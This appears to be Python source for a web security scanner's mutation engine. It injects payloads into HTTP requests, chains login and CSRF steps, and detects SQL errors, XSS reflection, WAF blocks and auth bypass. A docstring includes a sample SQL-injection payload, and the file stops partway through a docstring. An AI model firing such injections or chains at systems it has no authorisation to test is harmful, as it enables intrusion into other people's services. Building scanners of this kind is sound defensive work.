"""
Request Mutation Engine for SentinelForge (Wraith++).

Upgrades Wraith from GET-only to full HTTP method support with:
- Chain mode: sequences of dependent requests (e.g., login → get CSRF → exploit)
- Structured evidence output: every action produces typed evidence for the causal graph
- Response diffing: semantic comparison for auth testing (Persona system)
- Payload mutation: feedback-driven payload selection (not random, not GA)

This is the "Predator" engine — it traverses attack graph edges by executing
structured exploitation chains with evidence capture at each step.
"""

from __future__ import annotations

import asyncio
import enum
import hashlib
import time
import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple, Union
from urllib.parse import urlencode, urlparse, urljoin

import httpx


# ---------------------------------------------------------------------------
# Enums and Types
# ---------------------------------------------------------------------------

class HttpMethod(str, enum.Enum):
    """HTTP methods supported by the mutation engine."""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    PATCH = "PATCH"
    DELETE = "DELETE"
    OPTIONS = "OPTIONS"
    HEAD = "HEAD"


class PayloadEncoding(str, enum.Enum):
    """How to encode the payload in the request body."""
    QUERY_PARAM = "query_param"        # ?param=PAYLOAD
    FORM_DATA = "form_data"            # application/x-www-form-urlencoded
    JSON_BODY = "json_body"            # application/json
    MULTIPART = "multipart"            # multipart/form-data
    RAW_BODY = "raw_body"              # Raw string body
    PATH_SEGMENT = "path_segment"      # /api/PAYLOAD/resource
    HEADER_VALUE = "header_value"      # X-Custom: PAYLOAD
    COOKIE_VALUE = "cookie_value"      # Cookie: param=PAYLOAD


class EvidenceType(str, enum.Enum):
    """Type of evidence captured from a response."""
    STATUS_DIFF = "status_diff"            # Status code changed
    CONTENT_DIFF = "content_diff"          # Response body differs
    REFLECTION = "reflection"              # Payload reflected in response
    ERROR_SIGNATURE = "error_signature"    # SQL/runtime error detected
    TIME_ANOMALY = "time_anomaly"          # Response time deviation
    HEADER_LEAK = "header_leak"            # Sensitive header exposed
    DATA_EXTRACTION = "data_extraction"    # Actual data extracted
    OOB_TRIGGER = "oob_trigger"            # Out-of-band callback received
    AUTH_BYPASS = "auth_bypass"            # Access without proper auth


class ActionOutcome(str, enum.Enum):
    """Structured outcome of a mutation action — fed back into Strategos."""
    SUCCESS = "success"                # Payload achieved intended effect
    FAILURE = "failure"                # Payload had no observable effect
    BLOCKED = "blocked"                # WAF/filter explicitly blocked
    TIMEOUT = "timeout"                # Request timed out
    ERROR = "error"                    # Application error (500, exception)
    UNEXPECTED = "unexpected"          # Response doesn't match any pattern
    PARTIAL = "partial"                # Some evidence but not conclusive


# ---------------------------------------------------------------------------
# Data Structures
# ---------------------------------------------------------------------------

@dataclass
class MutationPayload:
    """A single payload to be tested against a target."""
    value: str                                    # The actual payload string
    encoding: PayloadEncoding = PayloadEncoding.QUERY_PARAM
    param_name: str = ""                          # Parameter name for injection
    description: str = ""                         # Human-readable purpose
    vuln_class: str = ""                          # sqli, xss, ssrf, etc.
    expected_evidence: EvidenceType = EvidenceType.REFLECTION
    tier_required: int = 2                        # Minimum capability tier (T2a = 2)
    
    @property
    def fingerprint(self) -> str:
        """Content-addressed ID for dedup.
        
        Returns:
            16-character SHA256 hash prefix of canonicalized payload.
        """
        raw = f"{self.vuln_class}:{self.encoding.value}:{self.param_name}:{self.value}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]


@dataclass
class MutationRequest:
    """A fully constructed HTTP request ready to fire."""
    url: str
    method: HttpMethod = HttpMethod.GET
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    query_params: Dict[str, str] = field(default_factory=dict)
    body: Optional[Union[str, Dict[str, Any]]] = None
    content_type: Optional[str] = None
    timeout: float = 10.0
    payload: Optional[MutationPayload] = None     # The payload being tested (if any)
    step_label: str = ""                          # Human label for chain display
    
    def to_httpx_kwargs(self) -> Dict[str, Any]:
        """Convert to httpx request kwargs.
        
        Handles JSON vs form-encoded bodies, content-type negotiation,
        and httpx-compatible parameter passing.
        
        Returns:
            Dict ready to pass as **kwargs to httpx.request()
        """
        kwargs: Dict[str, Any] = {
            "method": self.method.value,
            "url": self.url,
            "headers": dict(self.headers),
            "cookies": dict(self.cookies),
            "params": dict(self.query_params) if self.query_params else None,
            "timeout": self.timeout,
            "follow_redirects": True,
        }
        
        if self.body is not None:
            if isinstance(self.body, dict):
                if self.content_type == "application/json" or self.method != HttpMethod.GET:
                    kwargs["json"] = self.body
                else:
                    kwargs["data"] = self.body
            else:
                kwargs["content"] = self.body
                if self.content_type:
                    kwargs["headers"]["Content-Type"] = self.content_type
        
        return kwargs


@dataclass
class MutationResponse:
    """Captured HTTP response with analysis metadata."""
    status_code: int
    headers: Dict[str, str]
    body: str
    body_length: int
    elapsed_ms: float
    url: str                    # Final URL (after redirects)
    redirect_chain: List[str] = field(default_factory=list)
    
    # Analysis fields (populated by oracles)
    evidence: List[Evidence] = field(default_factory=list)
    outcome: ActionOutcome = ActionOutcome.FAILURE
    
    @property
    def body_hash(self) -> str:
        """SHA256 hash of response body (first 16 chars).
        
        Used for quick response equivalence checks in baseline comparison.
        """
        return hashlib.sha256(self.body.encode(errors="replace")).hexdigest()[:16]
    
    @classmethod
    def from_httpx(cls, resp: httpx.Response, elapsed_ms: float) -> MutationResponse:
        """Construct MutationResponse from httpx.Response.
        
        Args:
            resp: httpx response object
            elapsed_ms: Request elapsed time in milliseconds
        
        Returns:
            Populated MutationResponse
        """
        redirect_chain = [str(r.url) for r in resp.history] if resp.history else []
        return cls(
            status_code=resp.status_code,
            headers={k: v for k, v in resp.headers.items()},
            body=resp.text,
            body_length=len(resp.text),
            elapsed_ms=elapsed_ms,
            url=str(resp.url),
            redirect_chain=redirect_chain,
        )


@dataclass
class Evidence:
    """A single piece of evidence captured during mutation testing.
    
    Evidence flows into the causal graph (core/cortex/causal_graph.py) and
    determines finding confirmation_level: confirmed (>0.9), probable (0.6-0.9),
    or hypothesized (<0.6).
    """
    type: EvidenceType
    description: str
    confidence: float = 0.0           # 0.0-1.0
    extracted_data: Optional[str] = None  # The actual extracted value (version string, DB output, etc.)
    payload_used: str = ""
    response_snippet: str = ""         # Relevant portion of response (max 500 chars)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert Evidence to serializable dict for causal graph.
        
        Returns:
            Dict with all fields; response_snippet capped at 500 chars.
        """
        return {
            "type": self.type.value,
            "description": self.description,
            "confidence": self.confidence,
            "extracted_data": self.extracted_data,
            "payload_used": self.payload_used,
            "response_snippet": self.response_snippet[:500],
            "metadata": self.metadata,
        }


# ---------------------------------------------------------------------------
# Chain Steps
# ---------------------------------------------------------------------------

@dataclass
class ChainStep:
    """One step in a multi-step exploitation chain.
    
    Example: GET /login form → extract CSRF token → POST login → check auth.
    Extractors pull values from responses for interpolation in later steps.
    """
    label: str                         # Human label: "Get CSRF token", "Submit login"
    request: MutationRequest
    extractors: List[ResponseExtractor] = field(default_factory=list)
    continue_on_fail: bool = False     # If this step fails, continue chain?
    delay_ms: int = 0                  # Delay before this step (rate limiting)
    

@dataclass
class ExtractionResult:
    """Value extracted from a response for use in subsequent chain steps.
    
    Used for variable interpolation: {csrf_token} in later requests.
    """
    name: str        # Variable name for interpolation
    value: str       # Extracted value
    source: str      # Where it came from (header, body regex, cookie, etc.)


class ResponseExtractor:
    """Extract values from responses for use in subsequent chain steps.
    
    Supports regex, JSON path, header, and cookie extraction. Values are
    interpolated into {name} placeholders in subsequent requests.
    """
    
    def __init__(
        self,
        name: str,
        source: str = "body",        # "body", "header", "cookie", "status"
        pattern: Optional[str] = None,  # Regex with capture group
        header_name: Optional[str] = None,
        cookie_name: Optional[str] = None,
        json_path: Optional[str] = None,  # Simple dotted path: "data.token"
    ):
        """Initialize ResponseExtractor.
        
        Args:
            name: Variable name for interpolation in later requests
            source: Where to extract from ("body", "header", "cookie", "status")
            pattern: Regex pattern with capture group for body extraction
            header_name: Header name for extraction
            cookie_name: Cookie name for extraction
            json_path: Dotted JSON path for extraction (e.g., "data.token")
        """
        self.name = name
        self.source = source
        self.pattern = re.compile(pattern) if pattern else None
        self.header_name = header_name
        self.cookie_name = cookie_name
        self.json_path = json_path
    
    def extract(self, response: MutationResponse) -> Optional[ExtractionResult]:
        """Extract a value from the response.
        
        Args:
            response: MutationResponse to extract from
        
        Returns:
            ExtractionResult if value found, None otherwise
        """
        value: Optional[str] = None
        
        if self.source == "body" and self.pattern:
            match = self.pattern.search(response.body)
            if match:
                value = match.group(1) if match.groups() else match.group(0)
        
        elif self.source == "body" and self.json_path:
            try:
                import json
                data = json.loads(response.body)
                for key in self.json_path.split("."):
                    if isinstance(data, dict):
                        data = data.get(key)
                    elif isinstance(data, list) and key.isdigit():
                        data = data[int(key)]
                    else:
                        data = None
                        break
                if data is not None:
                    value = str(data)
            except (json.JSONDecodeError, IndexError, TypeError):
                pass
        
        elif self.source == "header" and self.header_name:
            value = response.headers.get(self.header_name.lower())
        
        elif self.source == "cookie" and self.cookie_name:
            # Parse Set-Cookie headers
            for header_val in response.headers.get("set-cookie", "").split(","):
                if header_val.strip().startswith(f"{self.cookie_name}="):
                    value = header_val.split("=", 1)[1].split(";")[0].strip()
                    break
        
        elif self.source == "status":
            value = str(response.status_code)
        
        if value is not None:
            return ExtractionResult(
                name=self.name,
                value=value,
                source=f"{self.source}:{self.header_name or self.cookie_name or self.json_path or 'regex'}",
            )
        return None


@dataclass
class ChainResult:
    """Result of executing a complete exploitation chain.
    
    Contains evidence, extracted values, and overall outcome. Feeds into
    Finding construction in core/cortex/findings.py.
    """
    chain_id: str
    steps_completed: int
    steps_total: int
    success: bool
    evidence: List[Evidence]
    responses: List[MutationResponse]
    extracted_values: Dict[str, str]     # name → value from extractors
    elapsed_ms: float
    outcome: ActionOutcome
    error: Optional[str] = None
    
    @property
    def confirmation_level(self) -> str:
        """Derive confirmation level from evidence quality.
        
        Returns:
            "confirmed" (max confidence >= 0.9), "probable" (0.6-0.9),
            or "hypothesized" (<0.6 or no evidence).
        """
        if not self.evidence:
            return "hypothesized"
        max_confidence = max(e.confidence for e in self.evidence)
        if max_confidence >= 0.9:
            return "confirmed"
        elif max_confidence >= 0.6:
            return "probable"
        return "hypothesized"
    
    def to_finding_data(self) -> Dict[str, Any]:
        """Convert to data suitable for a Finding.
        
        Returns:
            Dict with chain metadata, evidence, and extracted values.
        """
        return {
            "chain_id": self.chain_id,
            "steps_completed": self.steps_completed,
            "steps_total": self.steps_total,
            "confirmation_level": self.confirmation_level,
            "evidence": [e.to_dict() for e in self.evidence],
            "extracted_values": self.extracted_values,
            "outcome": self.outcome.value,
            "elapsed_ms": self.elapsed_ms,
        }


# ---------------------------------------------------------------------------
# Response Oracles
# ---------------------------------------------------------------------------

# SQL error signatures for detection
SQL_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL syntax error", "mysql"),
    (r"Warning.*mysql_", "MySQL warning", "mysql"),
    (r"PostgreSQL.*ERROR", "PostgreSQL error", "postgresql"),
    (r"ORA-\d{5}", "Oracle error", "oracle"),
    (r"Microsoft.*ODBC.*SQL Server", "MSSQL ODBC error", "mssql"),
    (r"Unclosed quotation mark", "MSSQL unclosed quote", "mssql"),
    (r"SQLite3::SQLException", "SQLite error", "sqlite"),
    (r"sqlite3\.OperationalError", "SQLite Python error", "sqlite"),
    (r"pg_query\(\).*failed", "PostgreSQL query failed", "postgresql"),
    (r"System\.Data\.SqlClient", "MSSQL .NET error", "mssql"),
]

# XSS reflection patterns  
XSS_REFLECTION_PATTERNS = [
    r"<script[^>]*>",
    r"javascript:",
    r"on\w+\s*=",
    r"<img[^>]+onerror",
    r"<svg[^>]+onload",
]

# WAF detection signatures
WAF_SIGNATURES = [
    (r"mod_security|NOYB", "ModSecurity"),
    (r"cloudflare", "Cloudflare"),
    (r"aws.*waf|awselb", "AWS WAF"),
    (r"akamai|ghost", "Akamai"),
    (r"incapsula|imperva", "Imperva"),
    (r"sucuri", "Sucuri"),
    (r"barracuda", "Barracuda"),
    (r"f5.*big-?ip", "F5 BIG-IP"),
    (r"fortiweb", "FortiWeb"),
]


def detect_sql_errors(response: MutationResponse, payload: MutationPayload) -> List[Evidence]:
    """Oracle: detect SQL error signatures in response.
    
    Scans response for database-specific error messages indicating SQL injection.
    High confidence (0.85) on match due to specificity of patterns.
    
    Args:
        response: MutationResponse to analyze
        payload: MutationPayload that was sent
    
    Returns:
        List of Evidence (0 or 1 items, stops at first match)
    """
    evidence = []
    body_lower = response.body.lower()
    
    for pattern_str, desc, db_type in SQL_ERROR_PATTERNS:
        match = re.search(pattern_str, response.body, re.IGNORECASE)
        if match:
            # Find a snippet around the match
            start = max(0, match.start() - 50)
            end = min(len(response.body), match.end() + 100)
            snippet = response.body[start:end]
            
            evidence.append(Evidence(
                type=EvidenceType.ERROR_SIGNATURE,
                description=f"SQL error detected: {desc} ({db_type})",
                confidence=0.85,
                extracted_data=db_type,
                payload_used=payload.value,
                response_snippet=snippet,
                metadata={"db_type": db_type, "error_pattern": desc},
            ))
            break  # One SQL error is enough
    
    return evidence


def detect_reflection(response: MutationResponse, payload: MutationPayload) -> List[Evidence]:
    """Oracle: detect payload reflection in response (XSS indicator).
    
    Checks if payload appears in response body, with higher confidence
    if reflected in script context or HTML attributes.
    
    Args:
        response: MutationResponse to analyze
        payload: MutationPayload that was sent
    
    Returns:
        List of Evidence (0 or 1 items)
    """
    evidence = []
    
    if payload.value in response.body:
        # Direct reflection — high confidence
        idx = response.body.index(payload.value)
        start = max(0, idx - 30)
        end = min(len(response.body), idx + len(payload.value) + 50)
        snippet = response.body[start:end]
        
        # Check if it's in an executable context
        in_script = bool(re.search(r"<script[^>]*>[^<]*" + re.escape(payload.value), response.body, re.IGNORECASE))
        in_attr = bool(re.search(r'=\s*["\']?[^"\']*' + re.escape(payload.value), response.body))
        
        confidence = 0.95 if in_script else (0.80 if in_attr else 0.60)
        context = "script tag" if in_script else ("attribute" if in_attr else "body text")
        
        evidence.append(Evidence(
            type=EvidenceType.REFLECTION,
            description=f"Payload reflected in {context}",
            confidence=confidence,
            payload_used=payload.value,
            response_snippet=snippet,
            metadata={"context": context, "in_script": in_script, "in_attribute": in_attr},
        ))
    
    return evidence


def detect_time_anomaly(
    response: MutationResponse,
    baseline_ms: float,
    payload: MutationPayload,
    threshold_ms: float = 4500.0,
) -> List[Evidence]:
    """Oracle: detect significant time delay (blind SQLi/command injection).
    
    Compares response time against baseline. Delays > 4.5s indicate possible
    time-based blind injection. Confidence scales with delay magnitude.
    
    Args:
        response: MutationResponse to analyze
        baseline_ms: Baseline response time from unmutated request
        payload: MutationPayload that was sent
        threshold_ms: Minimum delay to trigger (default 4500ms)
    
    Returns:
        List of Evidence (0 or 1 items)
    """
    evidence = []
    delta = response.elapsed_ms - baseline_ms
    
    if delta > threshold_ms:
        evidence.append(Evidence(
            type=EvidenceType.TIME_ANOMALY,
            description=f"Response delayed by {delta:.0f}ms (baseline: {baseline_ms:.0f}ms)",
            confidence=min(0.95, 0.5 + (delta / (threshold_ms * 4))),  # Scales with delay
            payload_used=payload.value,
            metadata={
                "baseline_ms": baseline_ms,
                "actual_ms": response.elapsed_ms,
                "delta_ms": delta,
                "threshold_ms": threshold_ms,
            },
        ))
    
    return evidence


def detect_waf_block(response: MutationResponse) -> Optional[str]:
    """Detect WAF blocking. Returns WAF name or None.
    
    Checks response status codes and bodies for WAF signatures.
    Common blockers: 403 (Forbidden), 406 (Not Acceptable), 429 (Rate Limit),
    503 (Unavailable).
    
    Args:
        response: MutationResponse to analyze
    
    Returns:
        WAF name string if detected, None otherwise
    """
    if response.status_code in (403, 406, 429, 503):
        combined = f"{response.body} {' '.join(f'{k}: {v}' for k, v in response.headers.items())}"
        for pattern_str, waf_name in WAF_SIGNATURES:
            if re.search(pattern_str, combined, re.IGNORECASE):
                return waf_name
    return None


def detect_status_diff(
    response: MutationResponse,
    baseline_status: int,
    payload: MutationPayload,
) -> List[Evidence]:
    """Oracle: detect status code changes from baseline.
    
    Significant transitions:
    - 403 → 200: auth bypass (0.9 confidence)
    - Any → 500+: application error (0.7 confidence)
    - Other changes: lower confidence (0.4)
    
    Args:
        response: MutationResponse to analyze
        baseline_status: Status code from unmutated request
        payload: MutationPayload that was sent
    
    Returns:
        List of Evidence (0 or 1 items)
    """
    evidence = []
    
    if response.status_code != baseline_status:
        # Interesting transitions
        is_error = response.status_code >= 500
        is_auth_change = (baseline_status == 403 and response.status_code == 200)
        
        confidence = 0.90 if is_auth_change else (0.70 if is_error else 0.40)
        
        evidence.append(Evidence(
            type=EvidenceType.AUTH_BYPASS if is_auth_change else EvidenceType.STATUS_DIFF,
            description=f"Status changed: {baseline_status} → {response.status_code}",
            confidence=confidence,
            payload_used=payload.value,
            metadata={
                "baseline_status": baseline_status,
                "actual_status": response.status_code,
                "is_error": is_error,
                "is_auth_bypass": is_auth_change,
            },
        ))
    
    return evidence


# ---------------------------------------------------------------------------
# Semantic Response Diffing (for Persona system)
# ---------------------------------------------------------------------------

@dataclass
class ResponseDiff:
    """Semantic diff between two responses.
    
    Used by Persona system (differential authentication testing).
    Strips dynamic fields (CSRF tokens, timestamps) before comparison.
    """
    status_differs: bool
    body_length_delta: int
    body_hash_differs: bool
    unique_keys_a: List[str]         # JSON keys only in response A
    unique_keys_b: List[str]         # JSON keys only in response B
    record_count_a: Optional[int]    # Number of records in A (if array response)
    record_count_b: Optional[int]
    confidence: float                # How confident we are this is a real diff
    description: str
    
    @property
    def is_significant(self) -> bool:
        """Check if this diff is worth reporting.
        
        Returns:
            True if status differs, record counts differ, body > 100 chars different,
            or unique keys found.
        """
        if self.status_differs:
            return True
        if self.record_count_a is not None and self.record_count_b is not None:
            return self.record_count_a != self.record_count_b
        if abs(self.body_length_delta) > 100:
            return True
        if self.unique_keys_a or self.unique_keys_b:
            return True
        return False


def diff_responses(a: MutationResponse, b: MutationResponse) -> ResponseDiff:
    """Semantic diff between two responses.
    
    Strips dynamic fields (timestamps, CSRF tokens, session IDs) before comparing.
    Used by Persona differential analysis for authentication testing.
    
    Example: "Is response as authenticated admin different from authenticated user?"
    
    Args:
        a: First MutationResponse
        b: Second MutationResponse
    
    Returns:
        ResponseDiff with semantic analysis
    """
    import json
    
    status_differs = a.status_code != b.status_code
    body_length_delta = a.body_length - b.body_length
    body_hash_differs = a.body_hash != b.body_hash
    
    unique_keys_a: List[str] = []
    unique_keys_b: List[str] = []
    record_count_a: Optional[int] = None
    record_count_b: Optional[int] = None
    
    # Dynamic fields to strip before comparison
    DYNAMIC_FIELDS = {"csrf", "token", "nonce", "timestamp", "ts", "session", "sid", "request_id"}
    
    def _strip_dynamic(data: Any) -> Any:
        """Recursively strip dynamic fields from JSON data."""
        if isinstance(data, dict):
            return {k: _strip_dynamic(v) for k, v in data.items()
                    if k.lower() not in DYNAMIC_FIELDS}
        elif isinstance(data, list):
            return [_strip_dynamic(item) for item in data]
        return data
    
    def _extract_keys(data: Any, prefix: str = "") -> set:
        """Extract all key paths from nested JSON."""
        keys = set()
        if isinstance(data, dict):
            for k, v in data.items():
                full_key = f"{prefix}.{k}" if prefix else k
                keys.add(full_key)
                keys.update(_extract_keys(v, full_key))
        elif isinstance(data, list) and data:
            keys.update(_extract_keys(data[0], f"{prefix}[]"))
        return keys
    
    # Try JSON comparison
    try:
        json_a = _strip_dynamic(json.loads(a.body))
        json_b = _strip_dynamic(json.loads(b.body))
        
        keys_a = _extract_keys(json_a)
        keys_b = _extract_keys(json_b)
        unique_keys_a = sorted(keys_a - keys_b)
        unique_keys_b = sorted(keys_b - keys_a)
        
        # Count records if top-level is array or has a data array
        def _count_records(data: Any) -> Optional[int]:
            if isinstance(data, list):
                return len(data)
            if isinstance(data, dict):
                for key in ("data", "results", "items", "records", "users", "entries"):
                    if key in data and isinstance(data[key], list):
                        return len(data[key])
            return None
        
        record_count_a = _count_records(json_a)
        record_count_b = _count_records(json_b)
        
    except (json.JSONDecodeError, TypeError):
        pass
    
    # Build confidence score
    confidence = 0.0
    descriptions = []
    
    if status_differs:
        confidence = max(confidence, 0.85)
        descriptions.append(f"status: {a.status_code} vs {b.status_code}")
    
    if record_count_a is not None and record_count_b is not None and record_count_a != record_count_b:
        confidence = max(confidence, 0.90)
        descriptions.append(f"records: {record_count_a} vs {record_count_b}")
    
    if unique_keys_a or unique_keys_b:
        confidence = max(confidence, 0.75)
        if unique_keys_a:
            descriptions.append(f"keys only in A: {unique_keys_a[:3]}")
        if unique_keys_b:
            descriptions.append(f"keys only in B: {unique_keys_b[:3]}")
    
    if body_hash_differs and not descriptions:
        confidence = max(confidence, 0.30)
        descriptions.append(f"body length delta: {body_length_delta}")
    
    return ResponseDiff(
        status_differs=status_differs,
        body_length_delta=body_length_delta,
        body_hash_differs=body_hash_differs,
        unique_keys_a=unique_keys_a,
        unique_keys_b=unique_keys_b,
        record_count_a=record_count_a,
        record_count_b=record_count_b,
        confidence=confidence,
        description="; ".join(descriptions) if descriptions else "no significant difference",
    )


# ---------------------------------------------------------------------------
# The Mutation Engine
# ---------------------------------------------------------------------------

class MutationEngine:
    """Core engine for executing HTTP mutations with evidence capture.
    
    Supports:
    - Single request with payload injection
    - Multi-step chains with value extraction
    - Baseline comparison (automatic)
    - WAF detection and reporting
    - Per-target rate limiting
    
    Example:
        engine = MutationEngine()
        payload = MutationPayload(
            value="' OR '1'='1",
            encoding=PayloadEncoding.QUERY_PARAM,
            param_name="id",
            vuln_class="sqli"
        )
        response, outcome = await engine.mutate_and_analyze(
            url="http://target.com/api/users",
            payload=payload
        )
        for evidence in response.evidence:
            print(f"{evidence.type}: {evidence.description}")
    """
    
    def __init__(
        self,
        client: Optional[httpx.AsyncClient] = None,
        rate_limit_ms: int = 100,      # Minimum ms between requests to same host
        max_retries: int = 2,
    ):
        """Initialize MutationEngine.
        
        Args:
            client: Optional httpx.AsyncClient. If None, creates one internally.
            rate_limit_ms: Minimum ms between requests to same host (default 100)
            max_retries: Max retries on transport failure (default 2)
        """
        self._client = client
        self._owns_client = client is None
        self._rate_limit_ms = rate_limit_ms
        self._max_retries = max_retries
        self._last_request_time: Dict[str, float] = {}  # host → timestamp
        self._baselines: Dict[str, MutationResponse] = {}  # url → baseline response
        self._waf_cache: Dict[str, Optional[str]] = {}  # host → detected WAF name
    
    async def _get_client(self) -> httpx.AsyncClient:
        """Get or create httpx client.
        
        Returns:
            httpx.AsyncClient instance
        """
        if self._client is None:
            self._client = httpx.AsyncClient(
                follow_redirects=True,
                timeout=httpx.Timeout(15.0, connect=5.0),
                verify=False,  # Security scanner — may hit self-signed certs
            )
        return self._client
    
    async def close(self) -> None:
        """Close the internal httpx client if owned.
        
        Should be called in cleanup (async context manager or finally block).
        """
        if self._owns_client and self._client is not None:
            await self._client.aclose()
            self._client = None
    
    async def _rate_limit(self, host: str) -> None:
        """Enforce per-host rate limiting.
        
        Sleeps if necessary to maintain configured minimum delay between
        requests to the same host.
        
        Args:
            host: Target hostname
        """
        last = self._last_request_time.get(host, 0)
        elapsed = (time.time() - last) * 1000
        if elapsed < self._rate_limit_ms:
            await asyncio.sleep((self._rate_limit_ms - elapsed) / 1000)
        self._last_request_time[host] = time.time()
    
    async def send(self, request: MutationRequest) -> MutationResponse:
        """Send a single HTTP request and capture the response.
        
        Handles timeouts and transport errors gracefully, returning
        MutationResponse with outcome set appropriately.
        
        Args:
            request: MutationRequest to send
        
        Returns:
            MutationResponse with status, headers, body, and timing
        """
        client = await self._get_client()
        host = urlparse(request.url).hostname or "unknown"
        await self._rate_limit(host)
        
        kwargs = request.to_httpx_kwargs()
        
        start = time.monotonic()
        try:
            resp = await client.request(**kwargs)
            elapsed_ms = (time.monotonic() - start) * 1000
            return MutationResponse.from_httpx(resp, elapsed_ms)
        except httpx.TimeoutException:
            elapsed_ms = (time.monotonic() - start) * 1000
            return MutationResponse(
                status_code=0,
                headers={},
                body="",
                body_length=0,
                elapsed_ms=elapsed_ms,
                url=request.url,
                evidence=[],
                outcome=ActionOutcome.TIMEOUT,
            )
        except httpx.HTTPError as exc:
            elapsed_ms = (time.monotonic() - start) * 1000
            return MutationResponse(
                status_code=0,
                headers={},
                body=str(exc),
                body_length=0,
                elapsed_ms=elapsed_ms,
                url=request.url,
                evidence=[],
                outcome=ActionOutcome.ERROR,
            )
    
    async def get_baseline(self, url: str, headers: Optional[Dict[str, str]] = None) -> MutationResponse:
        """Get or fetch baseline response for a URL.
        
        Caches baselines to avoid redundant requests. Used for comparison
        in mutate_and_analyze() and time-based oracle detection.
        
        Args:
            url: Target URL
            headers: Optional headers to send with baseline request
        
        Returns:
            Cached or freshly-fetched MutationResponse
        """
        if url not in self._baselines:
            request = MutationRequest(url=url, headers=headers or {})
            self._baselines[url] = await self.send(request)
        return self._baselines[url]
    
    def clear_baseline(self, url: str) -> None:
        """Clear cached baseline for URL.
        
        Use when target state has changed (e.g., after privilege escalation).
        
        Args:
            url: Target URL
        """
        self._baselines.pop(url, None)
    
    async def mutate_and_analyze(
        self,
        url: str,
        payload: MutationPayload,
        method: HttpMethod = HttpMethod.GET,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        base_params: Optional[Dict[str, str]] = None,
    ) -> Tuple[MutationResponse, ActionOutcome]:
        """Send a mutated request and run all applicable oracles.
        
        Automatically fetches baseline, injects payload, sends request,
        and runs detection oracles (SQL errors, XSS reflection, WAF detection,
        time anomalies, status changes).
        
        Args:
            url: Target URL
            payload: MutationPayload to inject
            method: HTTP method (default GET)
            headers: Optional headers dict
            cookies: Optional cookies dict
            base_params: Optional base query params (payload added to these)
        
        Returns:
            Tuple of (MutationResponse with evidence attached, ActionOutcome)
        """
        # Build the mutated request
        request = self._build_mutated_request(
            url=url,
            payload=payload,
            method=method,
            headers=headers or {},
            cookies=cookies or {},
            base_params=base_params or {},
        )
        
        # Get baseline for comparison
        baseline = await self.get_baseline(url, headers)
        
        # Send mutated request
        response = await self.send(request)
        
        # Short-circuit on transport failures
        if response.status_code == 0:
            return response, response.outcome
        
        # Run oracles
        all_evidence: List[Evidence] = []
        
        # WAF detection (cached per host)
        host = urlparse(url).hostname or "unknown"
        if host not in self._waf_cache:
            self._waf_cache[host] = detect_waf_block(response)
        
        waf_name = detect_waf_block(response)
        if waf_name:
            response.outcome = ActionOutcome.BLOCKED
            all_evidence.append(Evidence(
                type=EvidenceType.STATUS_DIFF,
                description=f"Blocked by {waf_name} WAF",
                confidence=0.90,
                payload_used=payload.value,
                metadata={"waf": waf_name, "status": response.status_code},
            ))
        else:
            # SQL error detection
            if payload.vuln_class in ("sqli", "sql_injection", ""):
                all_evidence.extend(detect_sql_errors(response, payload))
            
            # Reflection detection
            if payload.vuln_class in ("xss", "reflected_xss", "stored_xss", ""):
                all_evidence.extend(detect_reflection(response, payload))
            
            # Time anomaly detection
            all_evidence.extend(detect_time_anomaly(response, baseline.elapsed_ms, payload))
            
            # Status diff detection
            all_evidence.extend(detect_status_diff(response, baseline.status_code, payload))
        
        response.evidence = all_evidence
        
        # Determine outcome
        if waf_name:
            outcome = ActionOutcome.BLOCKED
        elif any(e.confidence >= 0.8 for e in all_evidence):
            outcome = ActionOutcome.SUCCESS
        elif any(e.confidence >= 0.5 for e in all_evidence):
            outcome = ActionOutcome.PARTIAL
        elif response.status_code >= 500:
            outcome = ActionOutcome.ERROR
        else:
            outcome = ActionOutcome.FAILURE
        
        response.outcome = outcome
        return response, outcome
    
    def _build_mutated_request(
        self,
        url: str,
        payload: MutationPayload,
        method: HttpMethod,
        headers: Dict[str, str],
        cookies: Dict[str, str],
        base_params: Dict[str, str],
    ) -> MutationRequest:
        """Construct a request with the payload injected via the specified encoding.
        
        Handles all PayloadEncoding types: query param, form data, JSON,
        raw body, path segment, header, cookie.
        
        Args:
            url: Target URL
            payload: MutationPayload with value and encoding
            method: HTTP method
            headers: Headers dict
            cookies: Cookies dict
            base_params: Base query parameters
        
        Returns:
            MutationRequest with payload injected
        """
        query_params = dict(base_params)
        body: Optional[Union[str, Dict]] = None
        content_type: Optional[str] = None
        final_url = url
        
        if payload.encoding == PayloadEncoding.QUERY_PARAM:
            query_params[payload.param_name or "q"] = payload.value
        
        elif payload.encoding == PayloadEncoding.FORM_DATA:
            body = {payload.param_name or "data": payload.value}
            content_type = "application/x-www-form-urlencoded"
            if method == HttpMethod.GET:
                method = HttpMethod.POST
        
        elif payload.encoding == PayloadEncoding.JSON_BODY:
            body = {payload.param_name or "data": payload.value}
            content_type = "application/json"
            if method == HttpMethod.GET:
                method = HttpMethod.POST
        
        elif payload.encoding == PayloadEncoding.RAW_BODY:
            body = payload.value
            content_type = "text/plain"
            if method == HttpMethod.GET:
                method = HttpMethod.POST
        
        elif payload.encoding == PayloadEncoding.PATH_SEGMENT:
            # Replace {PAYLOAD} placeholder in URL, or append
            if "{PAYLOAD}" in url:
                final_url = url.replace("{PAYLOAD}", payload.value)
            else:
                final_url = url.rstrip("/") + "/" + payload.value
        
        elif payload.encoding == PayloadEncoding.HEADER_VALUE:
            headers[payload.param_name or "X-Custom"] = payload.value
        
        elif payload.encoding == PayloadEncoding.COOKIE_VALUE:
            cookies[payload.param_name or "test"] = payload.value
        
        return MutationRequest(
            url=final_url,
            method=method,
            headers=headers,
            cookies=cookies,
            query_params=query_params,
            body=body,
            content_type=content_type,
            payload=payload,
        )
    
    async def execute_chain(
        self,
        chain_id: str,
        steps: List[ChainStep],
        initial_values: Optional[Dict[str, str]] = None,
    ) -> ChainResult:
        """Execute a multi-step exploitation chain.
        
        Variables extracted from earlier steps are interpolated into later steps
        using {variable_name} placeholders in URLs, headers, body, etc.
        
        Example:
            # Step 1: GET login form, extract CSRF token
            # Step 2: POST login with CSRF token and credentials
            # Step 3: GET admin panel (now authenticated)
            
            steps = [
